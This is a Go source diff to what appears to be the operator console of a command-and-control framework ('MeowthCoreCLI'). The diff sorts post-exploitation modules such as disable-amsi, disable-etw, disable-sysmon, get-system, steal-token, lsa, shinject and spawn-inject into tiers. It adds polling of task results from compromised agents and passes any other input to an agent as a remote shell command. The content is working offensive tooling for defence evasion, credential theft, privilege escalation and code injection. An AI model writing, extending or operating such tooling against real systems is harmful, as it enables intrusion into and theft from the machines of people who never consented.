@@ -12,37 +12,39 @@ import (
 	"github.com/latortuga71/MeowthCoreCLI/internal"
 	"github.com/manifoldco/promptui"
 )
-
-var modules = [...]string{
-	"?",
-	"help",
-	"exit",
+var simple_modules = [...]string{
 	"whoami",
-	"runas",
-	"run",
-	"shell",
-	"shinject",
-	"admin-check",
-	"cd",
-	"mkdir",
-	"rmdir",
+	"ps",
+	"lsa",
+	"ping",
 	"disable-amsi",
 	"disable-etw",
 	"disable-sysmon",
-	"enable-priv",
-	"execute-assembly",
 	"get-system",
-	"ls",
-	"ps",
-	"lsa",
-	"ping-sweep",
 	"pwd",
 	"rev2self",
-	"spawn-inject",
-	"steal-token",
-	"turtle-dump",
-	"TestCommand",
 }
+
+var medium_modules = [...]string {
+	"runas",
+	"run",
+	"shell",
+	"cd",
+	"mkdir",
+	"rmdir",
+	"enable-priv",
+	"ls",
+	"ping-sweep",
+	"turtle-dump",
+	"steal-token",
+	"admin-check",
+}
+var complex_modules = [...]string {
+	"shinject",
+	"execute-assembly",
+	"spawn-inject",
+}
+
 
 func init(){
     interactCommand := &grumble.Command{
@@ -53,6 +55,43 @@ func init(){
     App.AddCommand(interactCommand)
 }
 
+
+func removeIndex(s []TaskResult, index int) [] TaskResult{
+    return append(s[:index],s[index+1:]...)
+}
+
+func pollForNewTaskResults(){
+    for {
+        if CurrentAgent.agent == nil {
+            time.Sleep(time.Second * 10)
+            continue
+        }
+        PendingTaskQueue.Lock()
+        //var idxArray []int
+        for idx, taskResult := range PendingTaskQueue.results {
+            if taskResult.Result != "" {
+                //if not empty its already complete
+                continue
+            }
+	        var task TaskResult
+            tid := taskResult.Id
+            id := CurrentAgent.agent.Metadata.ID
+	        target := fmt.Sprintf("%s%s%s%s%s",FullServerURI,"Agents/",id,"/tasks/",tid)
+	        err := internal.GetResult(target, &task)
+	        if err != nil {
+	            continue	
+	        }
+            if len(strings.TrimSpace(task.Result)) == 0{
+                task.Result = "Complete"
+            }
+            PendingTaskQueue.results[idx].Result = task.Result
+            //idxArray = append(idxArray,idx)
+            fmt.Printf("\n::: %s ::: \n\n%s\n",task.Id,task.Result)
+        }
+        PendingTaskQueue.Unlock()
+        time.Sleep(time.Second * 5)
+    }
+}
 
 func chooseAgent(c *grumble.Context) error {
     if (len(AgentList.agents) == 0){
@@ -66,7 +105,9 @@ func chooseAgent(c *grumble.Context) error {
 	if err != nil {
 		return err
 	}
-	CurrentAgent = &AgentList.agents[idx]
+	CurrentAgent.agent = &AgentList.agents[idx]
+    fmt.Println("Starting background goroutine...")
+    go pollForNewTaskResults()
 	agentShell()
     return nil
 }
@@ -74,21 +115,28 @@ func chooseAgent(c *grumble.Context) error {
 func agentShell() error {
 	reader := bufio.NewReader(os.Stdin)
 	for {
-		fmt.Printf(CurrentAgent.Metadata.Username+ "@" + CurrentAgent.Metadata.Hostname+ " > ")
+		fmt.Printf(CurrentAgent.agent.Metadata.Username+ "@" + CurrentAgent.agent.Metadata.Hostname+ " > ")
 		tmp, err := reader.ReadString('\n')
 		if err != nil {
-			CurrentAgent = nil
+            CurrentAgent.Lock()
+			CurrentAgent.agent = nil
+            CurrentAgent.Unlock()
 			return err
 		}
 		cmd := strings.TrimRight(tmp, "\n")
+        id := CurrentAgent.agent.Metadata.ID
 		switch cmd {
 		case "exit":
 			fmt.Println("Exiting...")
-			CurrentAgent = nil
+            CurrentAgent.Lock()
+			CurrentAgent.agent = nil
+            CurrentAgent.Unlock()
 			return nil
 		case "exit\r":
 			fmt.Println("Exiting...")
-			CurrentAgent = nil
+            CurrentAgent.Lock()
+			CurrentAgent.agent = nil
+            CurrentAgent.Unlock()
 			return nil
 		case "help":
 			showModules()	
@@ -96,8 +144,12 @@ func agentShell() error {
 		case "?":
 			showModules()	
 			break
+        case " ":
+            break
+        case "":
+            break
 		default:
-			handleTask(cmd)
+			handleTask(cmd,id)
 			break
 		}
 		time.Sleep(time.Millisecond * 500)
@@ -106,42 +158,151 @@ func agentShell() error {
 
 func showModules(){
 	fmt.Println("### Modules ###")
-	for x := range modules{
+	/*for x := range modules{
 		fmt.Println(modules[x])
+	}*/
+}
+
+func handleTask(cmd string,id string) error {
+    if (len(strings.TrimSpace(cmd)) == 0){
+        return nil
+    }
+	switch taskLevel(cmd){
+    case "simple":
+        return handleSimpleTask(cmd,id)
+    case "medium":
+        return handleMediumTask(cmd,id)
+    case "complex":
+        return handleComplexTask(cmd,id)
+	default:
+        return handleDefaultShellTask(cmd,id)
 	}
 }
 
-func handleTask(cmd string) error {
-	switch cmd {
-	case "whoami":
-		return handleSimpleTask(cmd)
-	default:
-		fmt.Println(cmd)
-		break
-	}
-	return nil
+func taskLevel(task string) string {
+    for _, module := range simple_modules {
+        if task == module {
+            return "simple"
+        }
+    }
+    for _, module := range medium_modules{
+        if task == module {
+            return "medium"
+        }
+    }
+    for _, module := range complex_modules{
+        if task == module {
+            return "complex"
+        }
+    }
+    return "not found"
 }
+
 // simple only sends taskname
 // medium send taskname and args
 // comples sends args taskname and base64 encoded file
-func handleSimpleTask(cmd string) error {
+func handleSimpleTask(cmd string,agent_id string) error {
 	task := &Task{
 		Command: cmd,
 	}
-	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",CurrentAgent.Metadata.ID)
+	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
 	err,taskid:= internal.PostTask(target,&task)	
 	if err != nil {
 		return err
 	}
 	fmt.Printf("%+v\n",taskid)
+    r := TaskResult{
+        Id: taskid,
+        Result: "",
+    }
+    PendingTaskQueue.Lock()
+    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
+    PendingTaskQueue.Unlock()
 	// add taskid to pending tasks Queue
+	//
 	return nil 
 }
 
 
-func handleMediumTask(){}
-func handleComplexTask(){}
+func handleMediumTask(cmd string,agent_id string) error {
+    // get args for medium task
+    var argString string
+    var cmdArgs []string
+    var task *Task
+    prompt := promptui.Prompt{
+        Label: "Arguments",
+        Default: argString,
+    }
+    result,_ := prompt.Run()
+    if result != "" {
+        cmdArgs = strings.Split(result," ")
+	    task = &Task{
+	    	Command: cmd,
+            Args:cmdArgs,
+	    }
+    } else {
+	    task = &Task{
+	    	Command: cmd,
+	    }
+    }
+	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
+	err,taskid:= internal.PostTask(target,&task)	
+	if err != nil {
+		return err
+	}
+	fmt.Printf("%+v\n",taskid)
+    r := TaskResult{
+        Id: taskid,
+        Result: "",
+    }
+    PendingTaskQueue.Lock()
+    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
+    PendingTaskQueue.Unlock()
+	// add taskid to pending tasks Queue
+	//
+	return nil 
+}
+func handleComplexTask(cmd string,agent_id string) error{
+	task := &Task{
+		Command: cmd,
+	}
+	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
+	err,taskid:= internal.PostTask(target,&task)	
+	if err != nil {
+		return err
+	}
+	fmt.Printf("%+v\n",taskid)
+    r := TaskResult{
+        Id: taskid,
+        Result: "",
+    }
+    PendingTaskQueue.Lock()
+    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
+    PendingTaskQueue.Unlock()
+	// add taskid to pending tasks Queue
+	//
+	return nil 
+}
 
-
-
-
+func handleDefaultShellTask(args string, agent_id string) error {
+	task := &Task{
+		Command: "shell",
+        Args: strings.Split(args," "),
+	}
+	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
+	err,taskid:= internal.PostTask(target,&task)	
+	if err != nil {
+		return err
+	}
+	fmt.Printf("%+v\n",taskid)
+    r := TaskResult{
+        Id: taskid,
+        Result: "",
+    }
+    PendingTaskQueue.Lock()
+    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
+    PendingTaskQueue.Unlock()
+	// add taskid to pending tasks Queue
+	//
+	return nil 
+}
